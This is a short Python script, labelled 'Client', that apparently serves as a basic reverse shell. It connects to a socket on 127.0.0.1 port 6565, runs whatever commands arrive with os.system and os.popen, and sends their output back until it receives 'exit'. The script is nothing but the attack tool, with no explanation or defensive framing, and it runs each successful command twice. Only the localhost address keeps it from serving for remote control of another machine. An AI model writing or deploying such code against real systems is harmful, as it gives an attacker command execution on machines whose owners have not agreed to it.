# Client
import socket, os

s = socket.socket()
s.connect(("127.0.0.1", 6565))

# Code
command = s.recv(65535).decode()
while command != "exit":
    code = os.system(command)
    if code == 0:
        output = os.popen(command).read()
        s.send(output.encode())
    else:
        s.send("Unknown command".encode())
    command = s.recv(65535).decode()

s.close()
